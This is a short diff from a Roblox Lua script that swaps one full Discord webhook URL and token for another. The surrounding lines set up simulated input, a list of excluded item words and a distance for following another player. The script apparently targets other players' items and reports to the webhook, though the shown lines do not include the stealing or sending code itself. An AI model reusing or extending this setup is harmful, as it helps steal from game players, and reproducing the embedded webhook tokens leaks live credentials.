@@ -9,7 +9,7 @@ local VirtualInput = game:GetService("VirtualInputManager")
 local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1382769361487532032/SHIjTAh_fI13ZcyMb_rhX5GkkZ5JH_fn29qwJ5r2iYdKXLlIFkjUFaNFbXhZPJOVo3Gh"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1382932286126686208/_sIOUcRYqL5WqUtOliSpQHOwjd14Epd_o7GsNoxfdH4W-bwr4HXY9x23DJgq7XZ2RObG"
 
 local BANNED_ITEM_WORDS = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate"}
 local FOLLOW_DISTANCE = 3
